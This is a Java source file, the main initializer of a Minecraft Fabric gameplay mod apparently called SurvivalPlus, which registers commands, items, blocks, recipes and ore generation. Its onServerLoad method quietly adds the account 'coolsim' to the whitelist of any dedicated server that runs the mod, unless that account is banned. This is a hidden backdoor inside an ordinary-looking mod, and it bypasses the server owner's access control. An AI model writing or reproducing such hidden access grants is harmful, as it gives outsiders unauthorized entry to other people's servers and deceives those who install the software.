package net.coolsimulations.SurvivalPlus.core;

import java.io.File;

import com.mojang.authlib.GameProfile;

import net.coolsimulations.SurvivalPlus.api.SPCompatibilityManager;
import net.coolsimulations.SurvivalPlus.api.SPReference;
import net.coolsimulations.SurvivalPlus.core.commands.CommandConfrats;
import net.coolsimulations.SurvivalPlus.core.commands.CommandEmportant;
import net.coolsimulations.SurvivalPlus.core.commands.CommandIndeed;
import net.coolsimulations.SurvivalPlus.core.commands.CommandMourn;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSleep;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSmiley;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWail;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWak;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWeba;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWoo;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfig;
import net.coolsimulations.SurvivalPlus.core.init.FuelHandler;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusArmor;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusBlocks;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusFood;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusItems;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusTools;
import net.coolsimulations.SurvivalPlus.core.recipes.SPShieldRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusComposterRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusDispenserBehavior;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusBlockus;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEventHandler;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusUpdateHandler;
import net.coolsimulations.SurvivalPlus.core.world.SurvivalPlusOreGenerator;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.server.players.UserWhiteList;
import net.minecraft.server.players.UserWhiteListEntry;
import net.minecraft.world.item.crafting.RecipeSerializer;

public class SurvivalPlus implements ModInitializer {
	
	private static SurvivalPlus instance;
	public static SurvivalPlus getInstance()
	{
		return instance;
	}

	public static void onServerLoad() {
		ServerLifecycleEvents.SERVER_STARTED.register((server) -> {
			if(server.isDedicatedServer()) {

				GameProfile gameprofile = server.getProfileCache().get("coolsim");
				UserWhiteList whitelist = server.getPlayerList().getWhiteList();

				if(server.getPlayerList().isUsingWhitelist() && !whitelist.isWhiteListed(gameprofile) && !server.getPlayerList().getBans().isBanned(gameprofile)) {
					UserWhiteListEntry entry = new UserWhiteListEntry(gameprofile);
					whitelist.add(entry);
				}
			}
		});
	}

	@Override
	public void onInitialize() {

		SPCompatibilityManager.checkForCompatibleMods();
		SurvivalPlusConfig.init(new File(FabricLoader.getInstance().getConfigDir().toFile(), SPReference.MOD_ID + ".json"));
		SurvivalPlusUpdateHandler.init();

		CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
			CommandConfrats.register(dispatcher);
			CommandEmportant.register(dispatcher);
			CommandWoo.register(dispatcher);
			CommandWak.register(dispatcher);
			CommandSmiley.register(dispatcher);
			CommandWail.register(dispatcher);
			CommandIndeed.register(dispatcher);
			CommandMourn.register(dispatcher);
			CommandSleep.register(dispatcher);
			CommandWeba.register(dispatcher);
		});
		
		onServerLoad();

		SurvivalPlusBlocks.init();
		SurvivalPlusBlocks.register();
		SurvivalPlusItems.init();
		SurvivalPlusItems.register();
		SurvivalPlusFood.init();
		SurvivalPlusFood.register();

		SurvivalPlusComposterRecipes.init();

		SurvivalPlusArmor.init();
		SurvivalPlusArmor.register();
		SurvivalPlusTools.init();
		SurvivalPlusTools.register();

		FuelHandler.init();

		SurvivalPlusDispenserBehavior.init();
		registerRecipes();
		setupEvent();

		SurvivalPlusEventHandler.init();
		
		if(SPCompatibilityManager.isBlockusLoaded()) {
			SurvivalPlusBlockus.init();
			SurvivalPlusBlockus.register();
		}
	}
	
	public void setupEvent() {
		SurvivalPlusOreGenerator.generateOres();
	}

	public void registerRecipes() {
		RecipeSerializer.register(SPReference.MOD_ID + ":crafting_special_spshielddecoration", SPShieldRecipes.CRAFTING_SPECIAL_SPSHIELD);
	}

}
